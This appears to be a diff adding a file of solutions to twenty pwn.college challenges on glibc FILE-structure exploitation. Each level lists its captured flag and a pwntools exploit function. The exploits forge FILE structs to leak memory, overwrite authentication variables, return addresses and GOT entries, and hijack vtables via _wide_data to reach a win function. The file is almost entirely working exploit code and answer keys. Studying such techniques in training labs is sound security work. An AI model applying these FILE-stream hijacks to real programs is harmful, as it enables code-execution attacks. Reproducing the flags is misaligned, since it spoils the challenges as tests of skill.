@@ -1,0 +1,507 @@
+1. pwn.college{Qf-3hce1ZVNP6lLVX3auyMKZlTR.0FM0QzMsITNxUzW}
+def challenge1():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    flag_leak = 0x4040e0
+
+    fp = FileStructure()
+    payload = fp.write(flag_leak, 0x1E0)
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.send(payload)
+        info(p.clean())
+
+2. pwn.college{kKKEZ-1EZGTOyhtpw05Ywl3fOER.0VM0QzMsITNxUzW}
+def challenge2():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    authenticated = 0x4041F8
+
+    fp = FileStructure()
+    payload = fp.read(authenticated, 0x101)
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.send(payload)
+        p.send(b'a'*0x101)
+        info(p.clean())
+
+3. pwn.college{85IrR0nbLWsctCJcup9946dq3OD.0lM0QzMsITNxUzW}
+run this -> python3 file.py; cat /tmp/babyfile.txt
+def challenge3():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    fileno_ = p8(4)
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.send(fileno_)
+        info(p.clean())
+
+4. pwn.college{40fl3uv_TwHJhWLwLX69sI5pDUe.01M0QzMsITNxUzW} 
+def challenge4():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    win_addr = 0x401316
+    fp = FileStructure()
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.readuntil(b' stored at: '))
+        ret_addr = int(p.readlineb().strip().decode(), 16)
+        payload = fp.read(ret_addr, 0x101)
+        p.send(payload)
+        p.send(p64(win_addr) + b'a'*0x101)
+        info(p.clean())
+        p.poll(block=True)
+
+5. pwn.college{A3lgKc5BJbFOoz5YuwJL_4phCCS.0FN0QzMsITNxUzW} 
+def challenge5():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    flag = 0x4040c0
+    fp = FileStructure()
+    payload = fp.write(flag, 0x101)
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.send(payload)
+        info(p.clean())
+        p.poll(block=True)
+
+6. pwn.college{kafAVaFqPRkfpTA2djtJuiCPbZs.0VN0QzMsITNxUzW}
+def challenge6():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    authenticated = 0x4041F8
+
+    fp = FileStructure()
+    payload = fp.read(authenticated, 0x101)
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.send(payload)
+        p.sendline(b'a'*0x101)
+        info(p.clean())
+        p.poll(block=True)
+
+
+7. pwn.college{M-MNW4tFLXqTl_BBZjnnH_uJ38d.0lN0QzMsITNxUzW} 
+# todo
+# change address of wide_data to be a pointer to win on the stack
+# change address of vtable to IO_wfile_overflow
+def challenge7():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    fp = FileStructure()
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.readuntil(b'within libc is: '))
+        puts = int(p.readlineb().strip().decode(), 16)
+        libc.address = puts - libc.symbols['puts']
+        info(p.readuntil(b'located at: '))
+        name_buf = int(p.readlineb().strip().decode(), 16)
+
+        # set value of vtable to (_IO_wfile_jumps_maybe_mmap + 160)
+        fp.vtable = (libc.symbols['_IO_file_jumps'] - 0x6c0) + 160
+        # set _wide_data struct to point to (name_buf-0x68) that is set up
+        fp._wide_data = (name_buf+8)-0xe0 
+        # reset the lock value since it get clobbered
+        fp._lock = name_buf + 496
+        payload = bytes(fp)
+
+        # 1. rax = rdi+offset (rax = the wide_data struct)
+        # 2. rax = [rax+0xe0] (rax = the widedata vtable)
+        # 3. call [rax+0x68] (calls win) 
+
+        # 1. wide_data = (name_buf+8)
+        # 2. (name_buf-0x68) = [(name_buf+8)-0xe0]
+        # 3. call [(name_buf-0x68)+0x68]
+
+        p.send(p64(0x4012E6) + p64(name_buf-0x68))
+        p.send(payload)
+        info(p.clean())
+        p.poll(block=True)
+
+8. pwn.college{IkYzw3H7VrNOCORISULmqTCZUYd.01N0QzMsITNxUzW} 
+def challenge8():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    fp = FileStructure()
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.readuntil(b'within libc is: '))
+        puts = int(p.readlineb().strip().decode(), 16)
+        libc.address = puts - libc.symbols['puts']
+        info(p.readuntil(b'writing to: '))
+        name_buf = int(p.readlineb().strip().decode(), 16) - 272 + 0x200
+        
+
+        # set value of vtable to (_IO_wfile_jumps_maybe_mmap + 160)
+        fp.vtable = (libc.symbols['_IO_file_jumps'] - 0x6c0) + 160
+        # set _wide_data struct to point to (name_buf-0x68) that is set up
+        fp._wide_data = (name_buf+8)-0xe0 
+        # reset the lock value since it get clobbered
+        fp._lock = name_buf + 496
+        payload = bytes(fp)
+
+        # 1. rax = rdi+offset (rax = the wide_data struct)
+        # 2. rax = [rax+0xe0] (rax = the widedata vtable)
+        # 3. call [rax+0x68] (calls win) 
+
+        # 1. wide_data = (name_buf+8)
+        # 2. (name_buf-0x68) = [(name_buf+8)-0xe0]
+        # 3. call [(name_buf-0x68)+0x68]
+
+        # payload = fp; p64(0x00) = lock; p64(0x00) = padding; rest is addr of name_buf
+        p.send(payload + p64(0x00) + p64(0x00) + p64(0x4012E6) + p64(name_buf-0x68))
+        p.send(payload)
+        print(hex(name_buf))
+        info(p.clean())
+        
+        p.poll(block=True)
+
+9. pwn.college{0W7CKMpBAOjc_k3HVf0Tvr1Zjbp.0FO0QzMsITNxUzW}
+def challenge9():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    fp = FileStructure()
+    # not the actual win value but a bit into win because puts segfaults
+    win = 0x40188B
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        # get the address of libc
+        info(p.readuntil(b'within libc is: '))
+        puts = int(p.readlineb().strip().decode(), 16)
+        libc.address = puts - libc.symbols['puts']
+        stdout = libc.symbols['_IO_2_1_stdout_']
+        # set value of vtable to (_IO_wfile_jumps_maybe_mmap + 160)
+        fp.vtable = (libc.symbols['_IO_file_jumps'] - 0x6c0) + 160
+        # need wide_data to point to a pointer
+        # that pointer should be 0xe0 before another pointer
+        # that pointer should point to 0x68 before a pointer to WIN 
+        fp._wide_data = stdout + 232 - 0xe0
+        # reset the lock value since it get clobbered
+        fp._lock = stdout + 4416
+        payload = bytes(fp)
+        # send payload + win + pointer-0x68 which points to win 
+        p.send(payload + p64(win) + p64(stdout+224-0x68))
+        info(p.clean())
+        p.poll(block=True)
+
+10. pwn.college{oIRVoJ0ua4ZtpPGzs35RzhDJ0Ns.0VO0QzMsITNxUzW} 
+def challenge10():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    fp = FileStructure()
+    win = 0x4018E6
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        # get the address of libc and where the fp will be
+        info(p.readuntil(b'within libc is: '))
+        puts = int(p.readlineb().strip().decode(), 16)
+        libc.address = puts - libc.symbols['puts']
+        info(p.readuntil(b'writing to: '))
+        buf = int(p.readlineb().strip().decode(), 16)
+        # set value of vtable to (_IO_wfile_jumps_maybe_mmap + 160)
+        fp.vtable = (libc.symbols['_IO_file_jumps'] - 0x6c0) + 160
+        # need wide_data to point to a pointer
+        # that pointer should be 0xe0 before another pointer
+        # that pointer should point to 0x68 before a pointer to WIN 
+        fp._wide_data = buf + 232 - 0xe0
+        # reset the lock value since it get clobbered
+        fp._lock = buf + 4416
+        # set the value of $rdi="password" when win gets called
+        fp.flags = 0x64726f7773736170
+        payload = bytes(fp)
+        # send payload + win + pointer-0x68 which points to win 
+        p.send(payload + p64(win) + p64(buf+224-0x68))
+        info(p.clean())
+        p.poll(block=True)
+
+11. pwn.college{MCpKxVskb7fpOxO1Qptd9zqpxzv.0FM1QzMsITNxUzW} 
+def challenge11():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    fp = FileStructure()
+    flag_leak = 0x404100
+    payload = fp.write(flag_leak, 0x1E0)
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(b'new_note 100')
+        info(p.clean())
+        p.sendline(b'open_file')
+        info(p.clean())
+        p.sendline(b'write_fp')
+        p.send(payload)
+        info(p.clean())
+        p.sendline(b'write_file')
+        info(p.clean())
+        p.sendline(b'write_note')
+        info(p.clean())
+        p.poll(block=True)
+
+12. pwn.college{MLctiPIvUf_P5tM7buUPo6gcICF.0VM1QzMsITNxUzW} 
+def challenge12():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    authenticate_offset = 0x5170
+    fp = FileStructure()
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        info(p.readuntil(b'main is located at: '))
+        main = int(p.readlineb().strip().decode(), 16)
+        binary.address = main - binary.symbols['main']
+        authenticated = binary.address + authenticate_offset
+        payload = fp.read(authenticated, 2)
+        p.sendline(b'new_note 0 1')
+        info(p.clean())
+        p.sendline(b'open_file')
+        info(p.clean())
+        p.sendline(b'write_fp')
+        p.send(payload)
+        info(p.clean())
+        p.sendline(b'read_file 0')
+        p.send(b'a'*2)
+        info(p.clean())
+        p.sendline(b'authenticate')
+        info(p.clean())
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+
+13. pwn.college{4JrttzKWD5MFOJx4QGM1DEQ3BTh.0lM1QzMsITNxUzW}
+def challenge13():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    fp = FileStructure()
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        # get the location of the return address
+        info(p.readuntil(b'writing to is: '))
+        stack = int(p.readlineb().strip().decode(), 16)
+        ret_addr = stack + 152
+        # read what the return address is (main+201)
+        payload = fp.write(ret_addr, 16)
+        p.sendline(b'new_note 0 10')
+        info(p.clean())
+        p.sendline(b'open_file')
+        info(p.clean())
+        p.sendline(b'write_fp')
+        p.send(payload)
+        info(p.clean())
+        p.sendline(b'write_file 0')
+        info(p.readuntil(b'fp);\n'))
+        main = int.from_bytes(p.readlineb()[:6], "little") - 201
+        binary.address = main - binary.symbols['main']
+        win = p64(binary.symbols['win'])
+        # overwrite the return address with the address of win
+        fp = FileStructure()
+        payload = fp.read(ret_addr, 16)
+        info(p.clean())
+        p.sendline(b'write_fp')
+        p.send(payload)
+        info(p.clean())
+        p.sendline(b'read_file 0')
+        p.send(win + b'a'*(10-len(win)))
+        info(p.clean())
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+
+14. pwn.college{c_bHxwvEGOR0zXNukiIUfLBPcF_.01M1QzMsITNxUzW} 
+def challenge14():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    fp = FileStructure()
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:
+        # get the location of the return address
+        info(p.readuntil(b'writing to is: '))
+        stack = int(p.readlineb().strip().decode(), 16)
+        ret_addr = stack + 152
+        # leak the return address
+        p.sendline(b'new_note 0 10')
+        info(p.clean())
+        p.sendline(b'open_file')
+        info(p.clean())
+        p.sendline(b'write_fp')
+        # construct a payload
+        fp.write(ret_addr, 100)
+        fp.fileno = 2 # uses stderr instead of stdout
+        payload = bytes(fp)[:0x74] # only give the bytes up to the fileno        
+        p.send(payload)
+        info(p.clean())
+        p.sendline(b'close_file')
+        # get the address of main
+        main = int.from_bytes(p.readb()[1:8], "little") - 201
+        info(p.clean())
+        binary.address = main - binary.symbols['main']
+        win = p64(binary.symbols['win'])
+        # overwrite the return address with the address of win
+        fp = FileStructure()
+        payload = fp.read(ret_addr, 16)
+        info(p.clean())
+        p.sendline(b'write_fp')
+        p.send(payload)
+        info(p.clean())
+        p.sendline(b'read_file 0')
+        p.send(win + b'a'*(10-len(win)))
+        info(p.clean())
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+15. pwn.college{kPCIZf9Ysf0nN7XbvyGQ7lhhKui.0FN1QzMsITNxUzW}
+def challenge15():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    fp = FileStructure()
+
+    # with gdb.debug([CHALLENGE_NAME], '''
+    # disp/5i $rip
+    # disp/40gx $rsp
+    # b fread@plt
+    # ''') as p:
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:        
+        p.sendline(b'new_note 0 10')
+        info(p.clean())
+        p.sendline(b'open_file')
+        info(p.clean())
+        # write over the printf got address
+        win = p64(binary.symbols['win'])
+        payload = fp.read(binary.got.printf, 16)
+        info(p.clean())
+        p.sendline(b'write_fp')
+        p.send(payload)
+        info(p.clean())
+        p.sendline(b'read_file 0')
+        p.send(win + b'a'*(10-len(win)))
+        info(p.clean())
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+16. pwn.college{YPL7tnF0tJJbF4yKzueL1EC24Js.0VN1QzMsITNxUzW}  
+def challenge16():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    fp = FileStructure()
+    flag = 0x405100
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:  
+        # get the address of stdout file struct   
+        info(p.readuntil(b'within libc is: '))
+        puts = int(p.readlineb().strip().decode(), 16)
+        libc.address = puts - libc.symbols['puts']
+        stdout = libc.symbols['_IO_2_1_stdout_']
+        # setup to overwrite the stdout file struct
+        payload = fp.read(stdout, 116)
+        info(p.clean())
+        p.sendline(b'new_note 0 115')
+        info(p.clean())
+        p.sendline(b'open_file')
+        info(p.clean())
+        p.sendline(b'write_fp')
+        p.send(payload)
+        info(p.clean())
+        p.sendline(b'read_file 0')
+        # overwrite the stdout file struct
+        fp = FileStructure()
+        payload = fp.write(flag, 116)
+        p.send(payload)
+        info(p.clean())
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+17. pwn.college{U_lLF__6PUqniW6ZpAVDMo3vJHH.0lN1QzMsITNxUzW} 
+def challenge17():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    fp = FileStructure()
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:  
+        info(p.clean())
+        p.sendline(b'new_note 0 100')
+        info(p.clean())
+        p.sendline(b'open_file')
+        info(p.clean())
+        p.sendline(b'open_flag')
+        info(p.clean())
+        p.sendline(b'write_fp')
+        # change the fileno
+        fp.flags = 0xfbad2480
+        fp.fileno = 4 # fd of flag
+        payload = bytes(fp)[:0x74] # only give the bytes up to the fileno
+        p.send(payload)
+        info(p.clean())
+        # read the flag to note 0
+        p.sendline(b'read_file 0')
+        info(p.clean())
+        # write the flag from note 0 to /tmp/babyfile.txt
+        p.sendline(b'open_file')
+        p.sendline(b'write_file 0')
+        p.sendline(b'quit')
+        info(p.clean())
+        p.poll(block=True)
+
+18. pwn.college{UdtHQ_kMJF8dPyokAooqMVFLjWU.01N1QzMsITNxUzW}
+def challenge18():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(CHALLENGE_NAME)
+    fp = FileStructure()
+
+    with process([CHALLENGE_NAME], close_fds=False) as p:  
+        info(p.clean())
+        # get the address of libc
+        val = 0x405030
+        payload = fp.write(val, 101)
+        p.sendline(b'new_note 0 100')
+        info(p.clean())
+        p.sendline(b'open_file')
+        info(p.clean())
+        p.sendline(b'write_fp')
+        p.send(payload)
+        info(p.clean())
+        p.sendline(b'write_file 0')
+        info(p.readuntil(b'fp);\n'))
+        puts = int.from_bytes(p.readlineb()[:6], 'little')
+        libc.address = puts - libc.symbols['puts']
+        # get the address of fp
+        val = 0x405228
+        payload = fp.write(val, 101)
+        p.sendline(b'new_note 0 100')
+        info(p.clean())
+        p.sendline(b'open_file')
+        info(p.clean())
+        p.sendline(b'write_fp')
+        p.send(payload)
+        info(p.clean())
+        p.sendline(b'write_file 0')
+        info(p.readuntil(b'fp);\n'))
+        buf = int.from_bytes(p.readlineb()[:6], 'little')
+        # create a vtable fp and execute win
+        fp = FileStructure()
+        fp.vtable = (libc.symbols['_IO_file_jumps'] - 0x6c0) + 160
+        fp._wide_data = buf + 232 - 0xe0
+        fp._lock = buf + 4416
+        payload = bytes(fp)
+        p.sendline(b'write_fp')
+        p.send(payload + p64(binary.symbols['win']) + p64(buf+224-0x68))
+        info(p.clean())
+        p.sendline(b'write_file 0')
+        info(p.clean())
+        p.poll(block=True)
+
+
+19. pwn.college{I7PQFSMQFa2HCfxuly96Qnc0bhb.0FO1QzMsITNxUzW}
+...same as level 18
+
+20. pwn.college{07_3Kwtc6xd_wzziFuziHgiPzac.0VO1QzMsITNxUzW}
+...same as level 18 and 19
+
